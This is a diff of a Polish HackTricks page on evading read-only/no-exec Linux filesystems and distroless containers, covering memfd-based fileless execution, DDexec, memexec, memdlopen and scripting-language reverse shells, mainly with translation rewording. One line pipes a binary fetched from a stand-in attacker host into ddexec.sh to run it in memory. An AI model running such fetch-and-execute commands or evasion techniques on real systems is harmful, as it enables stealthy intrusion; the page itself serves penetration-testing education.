@@ -10,13 +10,13 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagana biegła znajomość języka polskiego, zarówno w mowie, jak i piśmie_).
+Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwego do zhakowania - **rekrutujemy!** (_wymagana biegła znajomość języka polskiego, zarówno pisanego, jak i mówionego_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -24,8 +24,8 @@ Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowa
 
 W poniższych filmach znajdziesz techniki omówione na tej stronie wyjaśnione bardziej szczegółowo:
 
-* [**DEF CON 31 - Badanie manipulacji pamięcią Linuxa dla Stealth i Ewazji**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**Intruzje Stealth z DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Badanie manipulacji pamięcią Linuxa dla Stealth i Unikania**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Intruzje stealth z DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
 ## Scenariusz tylko do odczytu / brak wykonywania
 
@@ -52,29 +52,29 @@ Z perspektywy zespołu czerwonego, to sprawia, że **trudno jest pobrać i wykon
 
 ## Najprostsze ominięcie: Skrypty
 
-Zauważ, że wspomniałem o binariach, możesz **wykonać dowolny skrypt**, o ile interpreter jest wewnątrz maszyny, jak **skrypt powłoki** jeśli `sh` jest obecne lub **skrypt pythonowy** jeśli jest zainstalowany `python`.
+Zauważ, że wspomniałem o binariach, możesz **wykonać dowolny skrypt**, o ile interpreter jest wewnątrz maszyny, na przykład **skrypt powłoki** jeśli `sh` jest obecne lub **skrypt pythonowy** jeśli `python` jest zainstalowany.
 
 Jednak to nie wystarczy do wykonania swojego binarnego backdoora lub innych narzędzi binarnych, które mogą być Ci potrzebne do uruchomienia.
 
 ## Ominięcia pamięci
 
-Jeśli chcesz wykonać binarny plik, ale system plików nie zezwala na to, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **zabezpieczenia nie mają zastosowania tam**.
+Jeśli chcesz wykonać binarny plik, ale system plików nie zezwala na to, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **zabezpieczenia tam nie obowiązują**.
 
 ### Ominięcie FD + exec syscall
 
-Jeśli masz potężne silniki skryptów wewnątrz maszyny, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarny plik do wykonania z pamięci, przechować go w deskryptorze pliku w pamięci (`create_memfd` syscall), który nie będzie chroniony przez te zabezpieczenia, a następnie wywołać **`exec syscall`** wskazując **fd jako plik do wykonania**.
+Jeśli masz potężne silniki skryptowe wewnątrz maszyny, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarny plik do wykonania z pamięci, przechować go w deskryptorze pliku w pamięci (`create_memfd` syscall), który nie będzie chroniony przez te zabezpieczenia, a następnie wywołać **wywołanie systemowe exec**, wskazując **fd jako plik do wykonania**.
 
-Do tego możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu binarny plik, a on wygeneruje skrypt w wskazanym języku z **binarnym skompresowanym i zakodowanym w base64** z instrukcjami do **dekodowania i dekompresji** w **fd** utworzonym za pomocą wywołania `create_memfd` syscall oraz wywołania **exec syscall** do jego uruchomienia.
+Do tego możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu binarny plik, a on wygeneruje skrypt w wskazanym języku z **binarnym skompresowanym i zakodowanym w base64** z instrukcjami do **dekodowania i rozpakowania** go w **fd** utworzonym za pomocą wywołania `create_memfd` syscall oraz wywołania **exec** syscall do jego uruchomienia.
 
 {% hint style="warning" %}
-To nie działa w innych językach skryptowych, takich jak PHP lub Node, ponieważ nie mają one **domyślnego sposobu na wywołanie surowych wywołań systemowych** z poziomu skryptu, więc nie można wywołać `create_memfd` do utworzenia **deskryptora pamięci** do przechowywania binarnego pliku.
+To nie działa w innych językach skryptowych, takich jak PHP lub Node, ponieważ nie mają one **domyślnego sposobu na wywołanie surowych wywołań systemowych** z poziomu skryptu, więc nie można wywołać `create_memfd` do utworzenia **fd pamięciowego** do przechowywania binarnego pliku.
 
-Co więcej, utworzenie **zwykłego deskryptora pliku** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będziesz mógł go uruchomić, ponieważ zastosowana zostanie **ochrona no-exec**.
+Co więcej, utworzenie **zwykłego fd** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będziesz mógł go uruchomić, ponieważ zastosowana zostanie **ochrona no-exec**.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika, która pozwala Ci **modyfikować pamięć własnego procesu**, nadpisując jego **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika, która pozwala **modyfikować pamięć własnego procesu**, nadpisując jego **`/proc/self/mem`**.
 
 Dlatego **kontrolując kod asemblera**, który jest wykonywany przez proces, możesz napisać **shellcode** i "zmienić" proces, aby **wykonał dowolny arbitralny kod**.
 
@@ -87,13 +87,13 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 ```
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) to naturalny kolejny krok po DDexec. To **zdemoralizowany shellcode DDexec**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe pliki binarne do załadowania i uruchomienia**.
+[**Memexec**](https://github.com/arget13/memexec) to naturalny kolejny krok po DDexec. To **zdemilitaryzowany shellcode DDexec**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe pliki binarne do załadowania i uruchomienia**.
 
-Możesz znaleźć przykład **użycia memexec do uruchamiania plików binarnych z odwróconym powłoką PHP** w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Możesz znaleźć przykład, jak **użyć memexec do uruchamiania plików binarnych z odwróconym powłokiem PHP** w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-O podobnym celu do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) umożliwia **łatwiejsze ładowanie plików binarnych** do późniejszego wykonania. Może nawet umożliwić ładowanie plików binarnych z zależnościami.
+O podobnym celu do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) umożliwia **łatwiejsze ładowanie plików binarnych** do późniejszego wykonania. Może nawet pozwolić na ładowanie plików binarnych z zależnościami.
 
 ## Ominięcie Distroless
 
@@ -101,7 +101,7 @@ O podobnym celu do DDexec, technika [**memdlopen**](https://github.com/arget13/m
 
 Kontenery Distroless zawierają tylko **niezbędne minimalne składniki do uruchomienia określonej aplikacji lub usługi**, takie jak biblioteki i zależności czasu wykonania, ale wykluczają większe składniki, takie jak menedżer pakietów, powłoka lub narzędzia systemowe.
 
-Celem kontenerów Distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez eliminację zbędnych składników** i minimalizację liczby podatności, które mogą być wykorzystane.
+Celem kontenerów Distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez eliminowanie zbędnych składników** i minimalizowanie liczby podatności, które mogą być wykorzystane.
 
 ### Odwrócona powłoka
 
@@ -111,23 +111,23 @@ W kontenerze Distroless możesz **nawet nie znaleźć `sh` ani `bash`** do uzysk
 Dlatego **nie** będziesz w stanie uzyskać **odwróconej powłoki** ani **wyliczyć** systemu, jak zazwyczaj robisz.
 {% endhint %}
 
-Jednak jeśli skompromitowany kontener uruchamia na przykład aplikację internetową flask, to zainstalowany jest Python, więc możesz uzyskać **odwróconą powłokę Pythona**. Jeśli uruchamia node, możesz uzyskać powłokę Node, podobnie z większością **języków skryptowych**.
+Jednak jeśli skompromitowany kontener uruchamia na przykład aplikację internetową flask, to python jest zainstalowany, więc możesz zdobyć **odwróconą powłokę Pythona**. Jeśli uruchamia node, możesz zdobyć odwróconą powłokę Node, podobnie z większością **języków skryptowych**.
 
 {% hint style="success" %}
 Korzystając z języka skryptowego, możesz **wyliczyć system** korzystając z możliwości języka.
 {% endhint %}
 
-Jeśli nie ma **ochrony `tylko do odczytu/bez wykonywania`**, możesz nadużyć swojej odwróconej powłoki, aby **zapisywać w systemie pliki binarne** i **wykonywać** je.
+Jeśli nie ma **ochrony `read-only/no-exec`**, możesz nadużyć swojej odwróconej powłoki, aby **zapisywać w systemie pliki binarne** i **wykonywać** je.
 
 {% hint style="success" %}
 Jednak w tego rodzaju kontenerach te zabezpieczenia zazwyczaj istnieją, ale możesz użyć **poprzednich technik wykonania w pamięci, aby je ominąć**.
 {% endhint %}
 
-Możesz znaleźć **przykłady** jak **wykorzystać niektóre podatności RCE** do uzyskania **odwróconych powłok języków skryptowych** i wykonywania plików binarnych z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Możesz znaleźć **przykłady** jak **wykorzystać niektóre podatności RCE** do uzyskania **odwróconych powłok języków skryptowych** i uruchamiania plików binarnych z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Jeśli jesteś zainteresowany **karierą w dziedzinie hakowania** i hakiem na niehakowalne - **rekrutujemy!** (_wymagana biegła znajomość języka polskiego w mowie i piśmie_).
+Jeśli jesteś zainteresowany **karierą w dziedzinie hakowania** i hakiem nie do przebicia - **rekrutujemy!** (_wymagana biegła znajomość języka polskiego w mowie i piśmie_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
